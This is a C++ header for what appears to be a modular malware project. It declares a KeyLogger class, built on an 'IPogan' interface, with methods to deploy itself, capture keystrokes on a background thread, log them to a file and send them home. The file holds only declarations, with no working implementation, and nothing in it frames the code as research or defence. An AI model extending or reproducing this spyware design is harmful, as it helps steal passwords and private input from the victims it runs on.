#ifndef _KEYLOGGER_H_
#define _KEYLOGGER_H_

#include "IPogan.h"

class KeyLogger : public IPogan
{
private:
	std::string log_file;
	std::thread keylogger_thread;

public:
	KeyLogger(std::string log_file);
	~KeyLogger();

	virtual void CleanUp();

	virtual void Deploy();

	virtual void CaptureKeys();
	
	virtual void SendToHome();

private:
	virtual bool Log(std::string text);
	
	virtual std::string GetKeyString(int keycode);
};

#endif
